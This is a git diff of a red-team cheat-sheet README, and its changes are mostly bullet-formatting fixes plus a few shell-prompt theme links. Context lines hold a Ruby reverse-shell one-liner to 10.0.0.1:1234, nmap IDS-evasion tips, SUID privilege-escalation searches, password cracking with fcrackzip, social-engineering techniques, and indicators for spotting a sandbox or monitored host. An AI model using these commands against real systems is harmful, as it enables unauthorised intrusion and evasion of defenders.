@@ -79,11 +79,9 @@ curl ifconfig.me
 
 1. Operating systems
    
-\- Tails OS  
-
-\- Whonix workstation & gateway  
-
-\- Qubes OS  
+- Tails OS  
+- Whonix workstation & gateway  
+- Qubes OS  
 
 
 
@@ -92,23 +90,15 @@ curl ifconfig.me
 
 2. Tor-Enabled Anonymization software
 
-\- ParrotOS anonsurf  
-
-\- [Auto_Tor_IP_changer by FDX100](https://github.com/FDX100/Auto_Tor_IP_changer )  
-
-\- [ kali-anonsurf by Und3rf10w](https://github.com/Und3rf10w/kali-anonsurf )  
-
-\- [Kalitorify by brainfucksec](https://github.com/brainfucksec/kalitorify)   
-
-\- [Anonsurf-multiplatform by SuperKPK99](https://github.com/SuperKPK99/anonsurf-multiplatform )  
-
-\- Mullvad CLI + script  
-
-\- Torghostng 
-
-\- Gluetun + Mullvad rotate (docker)  
-
-\- WireGuard key-rotate scripts  
+- ParrotOS anonsurf  
+- [Auto_Tor_IP_changer by FDX100](https://github.com/FDX100/Auto_Tor_IP_changer )  
+- [ kali-anonsurf by Und3rf10w](https://github.com/Und3rf10w/kali-anonsurf )  
+- [Kalitorify by brainfucksec](https://github.com/brainfucksec/kalitorify)   
+- [Anonsurf-multiplatform by SuperKPK99](https://github.com/SuperKPK99/anonsurf-multiplatform )  
+- Mullvad CLI + script  
+- Torghostng 
+- Gluetun + Mullvad rotate (docker)  
+- WireGuard key-rotate scripts  
 
 
 &nbsp;
@@ -120,12 +110,12 @@ curl ifconfig.me
 
 ***Automatically install essential hacking & dev tools on a fresh linux install***
 
-\- [Install tools script](https://github.com/80h3m14n/red-team-tools/blob/main/automation/install-tools.sh)
+- [Install tools script](https://github.com/80h3m14n/red-team-tools/blob/main/automation/install-tools.sh)
 
 
 ***Encrypting and decrypting files, directories, and text using multiple encryption algorithms***
 
-\- [Encryptz](https://github.com/80h3m14n/encryptz)
+- [Encryptz](https://github.com/80h3m14n/encryptz)
 
 
 
@@ -135,23 +125,15 @@ curl ifconfig.me
 
 Possible indicators that you just got pawned:
 
-\- Network restrictions
-
-\- Monitoring tools
-
-\- Fake user environment
-
-\- Synthetic input
-
-\- Weird routing/DNS
-
-\- Low-human-activity (empty Downloads, no browser history)
-
-\- You’re root/admin by default but with tight network rules
-
-\- Logging tools or “monitor” processes running silently such as `procmon`, `wireshark`, `tcpdump`, or `sysmon`
-
-\- Host is extremely low-spec (tiny RAM/CPU, tiny disk)
+- Network restrictions
+- Monitoring tools
+- Fake user environment
+- Synthetic input
+- Weird routing/DNS
+- Low-human-activity (empty Downloads, no browser history)
+- You’re root/admin by default but with tight network rules
+- Logging tools or “monitor” processes running silently such as `procmon`, `wireshark`, `tcpdump`, or `sysmon`
+- Host is extremely low-spec (tiny RAM/CPU, tiny disk)
 
 
 ```bash
@@ -181,14 +163,14 @@ ping google.com
 **Change Microsoft windows themes & font type**
 
 1. Reg file(run as admin and reboot)
-\- [Segoe Print Font](https://github.com/80h3m14n/red-team-tools/blob/main/utilities/segoe-print-font.reg)
+- [Segoe Print Font](https://github.com/80h3m14n/red-team-tools/blob/main/utilities/segoe-print-font.reg)
 
-
-\- You can open the file with notepad and change the font according to your preference.
+- You can open the file with notepad and change the font according to your preference.
 
 
 2. Green Powershell
-```
+
+```bash
 $Host.UI.RawUI.ForegroundColor = 'Green'
 ```
 
@@ -210,6 +192,10 @@ A custom shell refers to a user-defined command-line interface for operating sys
 
 - [Oh My Posh](https://ohmyposh.dev/)
 - [Starship](https://starship.rs/)
+- [Powerlevel10k](https://github.com/romkatv/powerlevel10k)
+- [Spaceship prompt](https://github.com/spaceship-prompt/spaceship-prompt)
+- [Pure](https://github.com/sindresorhus/pure)
+- [Oh My Zsh](https://ohmyz.sh/)
 
 
 
@@ -234,29 +220,18 @@ ffuf -w subs.txt -u https://FUZZ.target.com
 
 ### Social engineering tehniques
 
-\- Impersonation /identity theft - the attacker creates a fake online profile to impersonate an employee and trick colleagues into disclosing confidential information.  
-
-\- Phishing - email, text  
-
-\- Pretexting -  fabricates a convincing and detailed scenario  
-
-\- Baiting  - lure using free gifts, software  
-
-\- Tailgating - follow authorized person
-
-\- Shoulder surf
-
-\- Quid pro quo - bribe  
-
-\- Honeypot - fake online persona  
-
-\- Dumpster diving - trash, trash-can   
-
-\- Evil twin i.e fake wi-fi Access point  
-
-\- Vishing (Voice phishing) - phone calls or voice messages to impersonate a legitimate entity and extract sensitive information.  
-
-\- Typosquatting/ URL hijacking - slight misspelling of a legitimate website. 
+- Impersonation /identity theft - the attacker creates a fake online profile to impersonate an employee and trick colleagues into disclosing confidential information.  
+- Phishing - email, text  
+- Pretexting -  fabricates a convincing and detailed scenario  
+- Baiting  - lure using free gifts, software  
+- Tailgating - follow authorized person
+- Shoulder surf
+- Quid pro quo - bribe  
+- Honeypot - fake online persona  
+- Dumpster diving - trash, trash-can   
+- Evil twin i.e fake wi-fi Access point  
+- Vishing (Voice phishing) - phone calls or voice messages to impersonate a legitimate entity and extract sensitive information.  
+- Typosquatting/ URL hijacking - slight misspelling of a legitimate website. 
 
 
 ### Packet capture (Pcap) analysis
@@ -296,19 +271,19 @@ The goal of scanning is to discover how the target system responds to various in
 
 To bypass firewall blocks and avoid IDS/IPS detection:
 
-\- Slow Scans: Introduce delays between packets to evade rate-based detection.
+- Slow Scans: Introduce delays between packets to evade rate-based detection.
 
 ```bash
 sudo nmap -sS -v -v -Pn 192.168.0.0/24
 ```
 
-\- Fragmentation: Split packets to confuse firewalls and IDS.
+- Fragmentation: Split packets to confuse firewalls and IDS.
 
-\- Decoy Scans: Use spoofed IPs to hide the real source and overwhelm logging systems.
+- Decoy Scans: Use spoofed IPs to hide the real source and overwhelm logging systems.
 
-\- Custom Source Ports: Bypass firewall rules that allow traffic from specific ports (e.g., DNS on 53)
+- Custom Source Ports: Bypass firewall rules that allow traffic from specific ports (e.g., DNS on 53)
 
-\- Try alternative tools
+- Try alternative tools
 
 ```bash
 # Nmap full scan
@@ -377,19 +352,13 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 
 This is where the attacker uses the established access to achieve their goals/intentions.
 
-\- Internal recon 
-
-\- Data Exfiltration  
-
-\- Privilege Escalation  
-
-\- Lateral Movement  
-
-\- Command and Control (C2)  
-
-\- Malware installation  
-
-\- Vulnerability exploitation   
+- Internal recon 
+- Data Exfiltration  
+- Privilege Escalation  
+- Lateral Movement  
+- Command and Control (C2)  
+- Malware installation  
+- Vulnerability exploitation   
 
 
 ```bash
@@ -406,9 +375,8 @@ netstat -tulpn
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-\- [LOLBAS project - Windows ](https://lolbas-project.github.io/)  
-
-\- [GTOBins - Linux](https://gtfobins.github.io/) 
+- [LOLBAS project - Windows ](https://lolbas-project.github.io/)  
+- [GTOBins - Linux](https://gtfobins.github.io/) 
 
 
 
@@ -432,7 +400,7 @@ find / -writable -type f 2>/dev/null
 
 Web attacks exploit vulnerabilities in applications to steal data, disrupt services, or gain unauthorized access
 
-\- [OWASP](https://owasp.org/)
+- [OWASP](https://owasp.org/)
 
 ```bash
 # XSS payload
@@ -453,15 +421,13 @@ Password cracking is heavily limited by hardware capabilities. The speed and fea
 
 **Recommendations**
 
-\- High-end GPU's like RTX 4090
+- High-end GPU's like RTX 4090
 
-\- Rent powerful cloud GPU instances (e.g., AWS, Google Cloud)
+- Rent powerful cloud GPU instances (e.g., AWS, Google Cloud)
 
-\- Custom hardware like FPGAs or ASICs
+- Custom hardware like FPGAs or ASICs
 
-\- Quantum computing algorithms (Year 2025:Limitations in qubit stability and error correction)
-
-
+- Quantum computing algorithms (Year 2025:Limitations in qubit stability and error correction)
 
 
 
@@ -485,9 +451,9 @@ fcrackzip -v -u -D -p rockyou.txt file.zip
 
 To master essential cybersecurity tools like Metasploit and Burp Suite, focus on understanding their core functions and practice in legal environments.
 
-\- [Metasploit framework](https://github.com/rapid7/metasploit-framework)
+- [Metasploit framework](https://github.com/rapid7/metasploit-framework)
 
-\- [Burpsuite framework](https://portswigger.net/burp)
+- [Burpsuite framework](https://portswigger.net/burp)
 
 
 
@@ -511,17 +477,17 @@ This section includes links to references, services, tools, and assets for those
 
 Special thanks to individuals whom I incorporated their work into this repo. 
 
-\- [Roadmaps](https://roadmap.sh/)
+- [Roadmaps](https://roadmap.sh/)
 
-\- [LOLBAS project - Windows ](https://lolbas-project.github.io/)  
+- [LOLBAS project - Windows ](https://lolbas-project.github.io/)  
 
-\- [GTOBins - Linux](https://gtfobins.github.io/)
+- [GTOBins - Linux](https://gtfobins.github.io/)
 
-\- [Atomic red team](https://github.com/redcanaryco/atomic-red-team)
+- [Atomic red team](https://github.com/redcanaryco/atomic-red-team)
 
-\- [Zero-day](https://www.zero-day.cz/)
+- [Zero-day](https://www.zero-day.cz/)
 
-\- [Red team tools by A-poc](https://github.com/A-poc/RedTeam-Tools)
+- [Red team tools by A-poc](https://github.com/A-poc/RedTeam-Tools)
 
 
 &nbsp;
